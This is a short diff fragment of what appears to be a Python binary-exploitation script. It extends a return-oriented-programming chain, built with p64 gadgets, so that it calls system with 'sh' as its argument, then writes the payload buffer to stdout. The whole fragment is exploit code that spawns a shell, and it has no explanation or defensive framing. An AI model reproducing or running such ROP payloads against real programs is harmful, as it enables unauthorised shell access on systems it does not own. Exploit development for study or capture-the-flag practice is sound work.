@@ -30,3 +30,12 @@ rop += p64(pop_rsi_pop_r15_ret)
 rop += p64(h_address)
 rop += dummy
 rop += p64(strcpy)
+
+# Call system with 'sh' as parameter
+rop += p64(pop_rdi_ret)
+rop += p64(write_to)
+rop += p64(system)
+
+buf += rop
+
+sys.stdout.buffer.write(buf)
